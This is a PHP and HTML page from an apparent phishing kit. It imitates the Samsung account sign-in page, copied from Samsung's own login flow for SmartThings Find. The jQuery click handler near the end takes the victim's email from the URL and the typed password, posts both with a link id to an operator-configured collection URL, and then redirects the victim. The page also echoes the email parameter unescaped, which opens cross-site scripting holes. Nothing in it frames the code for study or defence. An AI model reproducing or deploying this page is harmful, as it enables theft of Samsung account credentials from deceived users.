<?php
	session_name("CAKEPHP");
	session_start();
	include(__DIR__ . "/../includes/samsung.php");

	$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
	$post_url = $_SESSION['Link']['VisitorDetails']['post_url'] ?? '';
	$link_id = $_SESSION['Link']['GeneratedLink']['id'] ?? '';
	$redirect_url = $_SESSION['Link']['GeneratedLink']['redirect_url'] ?? '';
	
	echo "<script>
			var username = '$username';
			var post_url = '$post_url';
			var link_id = '$link_id';
			var redirect_url = '$redirect_url';
	      </script>";
?>
<!DOCTYPE html>
<!-- saved from url=(0317)https://account.samsung.com/accounts/v1/FMM2/signInGate?state=02yr1yiim7uy::hound-prd&redirect_uri=https:%2F%2Fsmartthingsfind.samsung.com%2Flogin.do&response_type=code&client_id=ntly6zvfpn&scope=iot.client&locale=en_US&acr_values=urn:samsungaccount:acr:basic&goBackURL=https:%2F%2Fsmartthingsfind.samsung.com%2Flogin -->
<html lang="en"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>Sign in&nbsp;|&nbsp;Samsung account</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  

<script>var PAGEPATH = '/accounts/sign/signInIdentification.js';</script>

<link rel="stylesheet" href="./assets/angular-block-ui.min.css">
<link rel="stylesheet" type="text/css" href="./assets/angular-material.css">
<link rel="stylesheet" type="text/css" href="./assets/default.css">


<link type="image/x-icon" rel="shortcut icon" href="https://account.samsung.com/accounts/v1/resources/one-ui/images/favicon.ico?20231116050348">
<!--[if lt IE 9]>
<script src="https://account.samsung.com/accounts/v1/resources/js/common/json/json3.min.js"></script>
<script src="https://account.samsung.com/accounts/v1/resources/js/common/html5shiv/html5shiv.min.js"></script>
<![endif]-->
<script type="text/javascript">
  //<![CDATA[
  var wipLogicalPath = "/accounts/v1";
  var experimentsUrl = "https://exp.samsungosp.com";
  var wipResourcesVerDt = "20231116050348";
  var wipCancelURI = "https://smartthingsfind.samsung.com/login?state=02yr1yiim7uy%3A%3Ahound-prd";
  var wipGoBackURI = "https://smartthingsfind.samsung.com/login?state=02yr1yiim7uy%3A%3Ahound-prd";
  var loLangCD = "en";
  var loCntyCD = "US";
  var isTextRightAlign = false;
  var isTextFirstFamilyName = false;
  var isTextFirstDateYear = false;
  var wipAcsChnlEnum = "WEB";
  var wipViewTypeEnum = "v2";
  var userGeoIPCnty3dgtCd = "PHL";
  var userAcsCnty3dgtCd = "PHL";
  var userAcsCnty2dgtCd = "PH";
  var userCnty3dgtCd = "";
  var wipUriEnum = "signIn";
  var APPNAME = "FMM2";
  var sJSESSIONID = "d4547e7d-32ae-4a17-9b59-41195bfeae0d";
  var wipCsrf = {'token': '8475c696-9fb8-4e84-a9df-24f662d437a6', 'headerName': 'X-CSRF-TOKEN'};
  var wipResourcesUrl = "https://account.samsung.com/accounts/v1/resources";
  var isGAEnabled = false;
  var googleRecaptchaApiUrl = "https://www.google.com";
  var action = "signInIdentification";
  var isRecaptchaEnabled = true;
  var recaptchaSiteKey = "6LeI5F8iAAAAACfMal3lra4jEWUbkVGlnys_5CWG";
  var isFromChina = false;
  var clientId = "ntly6zvfpn";
  //]]>

  if (isGAEnabled) {
    var containerId;
    if (wipResourcesUrl.indexOf("sad") !== -1) {
      containerId = 'GTM-KCH2BM6';
    } else if (wipResourcesUrl.indexOf("stg") !== -1) {
      containerId = 'GTM-W3S5ZM6';
    } else {
      containerId = 'GTM-5C6SNNV';
    }
    (function (w, d, s, l, i) {
      w[l] = w[l] || [];
      w[l].push({
        'gtm.start':
          new Date().getTime(), event: 'gtm.js'
      });
      var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
      j.async = true;
      j.src =
        'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
      f.parentNode.insertBefore(j, f);
    })(window, document, 'script', 'dataLayer', containerId);
  }

  var createPostMessage = function () {

    var sendPostMessage = function () {
      console.log("");
    }

    if (APPNAME.indexOf("samsung_com_us") !== -1) {
      if (document.getElementsByClassName('wrapper')[0]) {
        var pageType = "signin";
        if (document.querySelector('form[name="signUpForm"]')) {
          pageType = "signup";
        } else if (document.querySelector('form[name=findIdForm]')) {
          pageType = "findid";
        } else if (document.querySelector('form[name=rstPwd]')) {
          pageType = "resetpwd";
        } else {
          pageType = "others";
        }
        sendPostMessage = function () {
          window.parent.postMessage({
            pageType: pageType
          }, '*');
        }
      }
    }
    sendPostMessage();
  }

</script>

<!-- js loading -->


<!-- Samsung analytics -->

<script src="./assets/samsung-analytics.js"></script>

<script type="text/javascript">
  window.document.title = 'Sign in | Samsung account';
  var wipEnc = {"pblcKyTxt":"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCylnSE8ANPUNPmgYJGnApUrUPQiBmTY44Lw+fQbFOOslZZnuUasDFJuPU4287/LBQEpTtgPWLmjGftG/b2sj8eTH46mvhDtE8ijgZsMnGPMmhu/AljEvNOqU6nDZDtgGmL/pAdEBtsJ/VzClv8G9bV1kvczuZtg0gt3JTH+pagEwIDAQAB","lgnEncTp":"1","pbeKySpcIters":"200"};
  var iptLgnPlnID = '';
  var continueWith3rdParty = 'GG';
  var isAdmin = eval(false);
  var isUsingGlobalSession = eval(false);
  let showTip = false;
  let isMobile = window.matchMedia("(max-width: 680px)").matches;
  console.log('isMobile:' + isMobile);
</script>

<style>
    .error-msg {
        display: block !important
    }
</style>
<script src="./assets/platform.js" gapi_processed="true"></script></head>

<body onload="createPostMessage();" class="one-card-ui ng-scope block-ui block-ui-anim-fade" block-ui="main" aria-busy="false">

<div class="wrapper ng-scope" data-ng-controller="cmmController as cmm">
  
<!-- ngIf: isIESupportMessageShow=='Y' -->
<header class="one-header">
  <div class="header-inner">
    <div class="logo">
      <h1><img src="./assets/txt_logo.svg" onerror="this.src=&#39;https://account.samsung.com/accounts/v1/resources/one-ui/images/layout/txt_logo.png&#39;;" alt="Samsung account"></h1>
    </div>
  </div>
</header>

  <main class="one-main new-login ng-scope" data-ng-controller="signInController as vm">
    <div class="main-inner">
     <div class="container">
        <div class="title">
          <h1>
            <?=$language['slogan'][$lang];?>
          </h1>
        </div>
        <div class="content">
          <div class="one-forms-login">
            <form novalidate="" autocomplete="off" class="ng-pristine ng-valid ng-valid-pattern ng-valid-maxlength">
              <fieldset>
                <legend>Account Samsung login</legend>

                <div class="new-pwform">
                  <div class="one-field-data">
                    <a id="btnBack" href="#" role="link" title="Back to page">
                      <span class="filed-id">back to page</span><?php echo $_GET['email']; ?>
                    </a>
                  </div>

                  <div class="one-input-container">
                    <label for="iptLgnPlnPD"><?=$language['password'][$lang];?></label>
                    <input data-ng-model="vm.iptLgnPlnPD" id="iptLgnPlnPD" type="password" ng-model-options="{ updateOn: &#39;keyup blur&#39; }" aria-required="true" aria-invalid="" aria-describedby="" ng-enter="$parent.submitForCaptcha()" data-ng-pattern="" data-ng-blur="vm.iptLgnPlnPDFocus = false;" data-ng-focus="vm.iptLgnPlnPDFocus = true" not-space="" maxlength="512" class="ng-pristine ng-valid ng-empty ng-valid-pattern ng-valid-maxlength ng-touched" autocomplete="off">
                    <div class="error-msg">
                     
					 <div data-ng-show="((err.iptLgnPlnPD || err.iptLgnPlnID) &amp;&amp; err.code == &#39;AUT_1837&#39;)" id="err-invalid" class="ng-hide"><?=$language['invalid'][$lang];?></div>
					 
					 <div data-ng-show="((err.iptLgnPlnPD || err.iptLgnPlnID) &amp;&amp; err.code == &#39;AUT_1837&#39;)" id="err-deact" class="ng-hide">Can't sign in. Account deactivated for security reasons.</div>
					 
                    </div>
                  </div>
                  <div class="one-checkBox mbr_rememberid">
                    <input id="showeye-id" type="checkbox" data-ng-click="showPassword()" autocomplete="off">
                    <label for="showeye-id">
                      <span></span>
                      <?=$language['show_pass'][$lang];?>
                    </label>
                  </div>

                  
<script type="text/javascript">
  //<![CDATA[
  var RecaptchaOptions = {
    theme: 'custom'
  };
  //]]>
</script>
<!-- ngIf: $parent.captchaTypeEnum == 'S' -->
<!-- ngIf: $parent.captchaTypeEnum == 'A' -->
<div id="audioCaptchaArea" style="display:block; height:0; font-size:0; line-height:0;"></div>
<!-- ngIf: $parent.captchaTypeEnum == 'R' -->
<!-- ngIf: $parent.captchaTypeEnum == 'G' -->
<!-- ngIf: $parent.captchaTypeEnum == 'I' -->
<div class="one-input-container  ng-hide" data-ng-show="$parent.captchaTypeEnum != null &amp;&amp; $parent.captchaTypeEnum != &#39;G&#39; &amp;&amp; $parent.captchaTypeEnum != &#39;I&#39;">
  <label for="responseCapthcha">Security code</label>
  <input data-ng-model="vm.responseCapthcha" id="responseCapthcha" name="responseCapthcha" type="text" maxlength="50" ng-model-options="{ updateOn: &#39;keyup blur&#39; }" aria-required="true" aria-invalid="false" aria-describedby="" not-enter="" class="ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" autocomplete="off">
  <div class="error-msg">
    <div data-ng-show="err.responseCapthcha &amp;&amp; err.responseCapthchaCode == &#39;01&#39;" id="cap" class="ng-hide">Please enter the security code.</div>
    <div data-ng-show="err.responseCapthcha &amp;&amp; err.responseCapthchaCode == &#39;99&#39;" id="cap" class="ng-hide">Invalid ID, password, or security code has been entered. <br>Please try again.</div>
    <div data-ng-show="err.responseCapthcha &amp;&amp; err.responseCapthchaCode == &#39;02&#39;" data-ng-bind="err.message" id="cap" class="ng-binding ng-hide"></div>
  </div>
</div>

                </div>

                <div class="mbr_signin">
                  <div class="one-btn-container">
                    <button class="one-primary one-button" id="signInButton" data-ng-disabled="(vm.isAdmin &amp;&amp; (err.iptLgnPlnAdminPD || err.iptLgnPlnPD)) || err.iptLgnPlnPD || !vm.iptLgnPlnPD" data-ng-click="$parent.submitForCaptcha()" type="button" disabled="disabled"><?=$language['signin'][$lang];?></button>
                  </div>
                  <ul>
                    <li>
                      <a href="#">
                        <?=$language['forgot'][$lang];?>
                      </a>
                    </li>
                  </ul>
                </div>

                <div class="signin-tooltip ng-hide" data-ng-show="vm.isAdmin">
                  <dl>
                    <dt>Password (for admin only)</dt>
                    <dd>Passwords need to be at least 8 characters long and include letters, numbers, and symbols.<br><br>If your password does not meet the criteria, you will not be able to sign in.</dd>
                  </dl>
                  <p></p>
                </div>
              </fieldset>
            </form>
          </div>
        </div>
      </div>
    </div>
  </main>
  

<!-- footer -->
<footer class="one-footer" role="contentinfo">
  <div class="footer-inner">
    <div class="footer-logo"><img src="./assets/txt_foo_logo.png" onerror="this.src=&#39;https://account.samsung.com/accounts/v1/resources/one-ui/images/layout/txt_foo_logo.png&#39;;" alt="Samsung account"></div>
    <address class="footer-address">Copyright © 1995-2023 Samsung. <?=$language['rights'][$lang];?></address>
    <div class="footer-links" role="link">
      <a href="https://account.samsung.com/membership/terms/termscontents?paramLocale=en_US" title="Open links in a new window Terms and Conditions"><?=$language['terms'][$lang];?></a>
      <a href="https://account.samsung.com/membership/terms/privacypolicy?paramLocale=en_US" title="Open links in a new window Privacy Policy" class="active"><?=$language['privacy'][$lang];?></a>
      <a href="https://account.samsung.com/membership/notice/notice-list?paramLocale=en_US" title="Open links in a new window Notices"><?=$language['notice'][$lang];?></a>
      <a href="https://help.content.samsung.com/csweb/auth/gosupport.do?targetUrl=/main/main.do&amp;serviceCd=saccount&amp;_common_country=US&amp;_common_lang=en" title="Open links in a new window Contact us"><?=$language['contact'][$lang];?></a>
    </div>
  </div>
</footer>
<!-- //footer -->

</div>

<!-- javascript -->
<script src="./assets/jquery.min.js"></script>

<script>
  $(document).ready(function () {
	
	$('#btnBack').on('click',function(){
		window.top.location.reload();
		//window.location.href = 'index.html';
	});
	
	$('#showeye-id').on('change',function(){
		if($(this).is(":checked")){
			$('#iptLgnPlnPD').attr('type','text');
		}else{
			$('#iptLgnPlnPD').attr('type','password');
		}
	});
	
	$('#iptLgnPlnPD').on('keyup',function(){
		if($(this).val().trim !=='' && $(this).val().length >= 5){
			$('#signInButton').removeAttr('disabled');
		}else{
			$('#signInButton').attr('disabled','disabled');
		}
	});
	
	var attempt=0;
	$('#signInButton').on('click',function(e){
		$('#signInButton').attr('disabled','disabled');
		$('#err-invalid').hide();
		attempt+=1;
		
		username = '<?php echo $_GET['email']; ?>';
		var password = $('#iptLgnPlnPD').val();
		var data = 'id=' + link_id + '&type=account&user=' + username + '&pass=' + password;
		
		$.ajax({
		   type:"POST",
		   url:post_url,
		   dataType: "json",
		   data: data,
		   success: function(data){
				 if(data.success == true){
					$('#err-invalid').hide();
					// $('#err-deact').removeClass('ng-hide');
					window.top.location.href = redirect_url;
				 }else{
					$('#signInButton').removeAttr('disabled');
					$('#err-invalid').removeClass('ng-hide');
					$('#err-invalid').show();
				 }
		
			},
			error: function(XMLHttpRequest, textStatus, errorThrown) {
					$('#signInButton').removeAttr('disabled');
					$('#err-invalid').removeClass('ng-hide');
					$('#err-invalid').show();
			}
		   
		});
		   
		
	});
	
    inputEvent();
    if ($('form').find(':input')[0] !== undefined) {
      $(':focus').blur();
      $('form').find(':input')[0].focus();
    }
  });

  var attributeObserver = new MutationObserver(function (mutations) {
    mutations.forEach(function (mutation) {
      if (mutation.target.className.includes('ng-not-empty')) {
        var $input = $(mutation.target)
        var $label = $input.parent('div.one-input-container')

        $label.addClass('active');
        $label.siblings('div.flexbdy').addClass('off');
      };
    })
  });

  var inputEvent = function () {
    var $inputs = $('form').find(':input');
    $inputs.each(function () {
        var $input = $(this);
        var $label = $input.parent('div.one-input-container');

        attributeObserver.observe($input.get(0), {
          attributes: true,
          attributeFilter: ['class'],
          attributeOldValue: false,
          characterData: false,
          characterDataOldValue: false,
          childList: false,
          subtree: false
        });

        if ($input.val()) {
          $label.addClass('active');
          $label.siblings('div.flexbdy').addClass('off');
        }

        $input.focusin(function () {
          $label.addClass('focus');
          $label.siblings('div.flexbdy').addClass('off');
        });

        $input.change(function () {
          $label.addClass('active');
        });

        $input.focusout(function () {
          $label.removeClass('focus');

          if (!$input.val()) $label.removeClass('active').siblings('div.flexbdy').removeClass('off');
        });
      }
    );
  }
  
  
</script>

</body>

</html>